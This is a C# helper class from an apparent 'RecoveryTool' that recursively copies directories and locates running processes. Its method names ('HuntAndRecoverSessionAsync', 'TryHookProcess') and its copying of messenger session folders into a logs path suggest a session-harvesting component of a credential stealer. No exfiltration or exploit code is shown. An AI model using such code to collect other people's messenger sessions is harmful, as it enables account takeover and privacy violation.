using System.Text.RegularExpressions;
using System.Diagnostics;

namespace RecoveryTool.Recovery.Messenger
{
    public static class MessengerHelper
    {
        public static async Task CopyDirectoryAsync(string sourceDir, string destDir)
        {
            foreach (var file in Directory.GetFiles(sourceDir))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                Directory.CreateDirectory(destDir);
                await Task.Run(() => File.Copy(file, destFile, true));
            }

            foreach (var directory in Directory.GetDirectories(sourceDir))
            {
                string destSubDir = Path.Combine(destDir, Path.GetFileName(directory));
                await CopyDirectoryAsync(directory, destSubDir);
            }
        }

        public static async Task CopyFilesAsync(string sourcePath, string targetPath, Func<FileInfo, bool> predicate)
        {
            var files = Directory.GetFiles(sourcePath)
                                 .Select(f => new FileInfo(f))
                                 .Where(predicate);
            foreach (var file in files)
            {
                string destFile = Path.Combine(targetPath, file.Name);
                Directory.CreateDirectory(targetPath);
                await Task.Run(() => File.Copy(file.FullName, destFile, true));
            }
        }

        public static async Task CopyDirectoriesAsync(string sourcePath, string targetPath, Func<DirectoryInfo, bool> predicate)
        {
            var directories = Directory.GetDirectories(sourcePath)
                                      .Select(d => new DirectoryInfo(d))
                                      .Where(predicate);
            foreach (var dir in directories)
            {
                string sessionDir = Path.Combine(targetPath, dir.Name);
                Directory.CreateDirectory(sessionDir);
                await CopyDirectoryAsync(dir.FullName, sessionDir);
            }
        }

        public static async Task<string?> HuntAndRecoverSessionAsync(string sourcePath, string logsPath, int nameLength)
        {
            await CopyDirectoryAsync(sourcePath, logsPath);
            await CopyFilesAsync(sourcePath, logsPath, fi => fi.Name.Length == nameLength);
            return logsPath;
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            foreach (FileInfo fi in source.GetFiles())
            {
                fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
            }

            foreach (DirectoryInfo subDir in source.GetDirectories())
            {
                DirectoryInfo nextTargetSubDir = target.CreateSubdirectory(subDir.Name);
                CopyAll(subDir, nextTargetSubDir);
            }
        }

        public static string TryHookProcess(string processName, string replace, string append)
        {
            var processes = Process.GetProcessesByName(processName);
            foreach (var prs in processes)
            {
                if (prs.MainModule != null)
                {
                    return Path.Combine(prs.MainModule.FileName.Replace(replace, ""), append);
                }
            }
            return "NotHooked";
        }

        public static bool ValidatePattern(string input, string pattern)
        {
            return Regex.IsMatch(input, pattern);
        }
    }
}
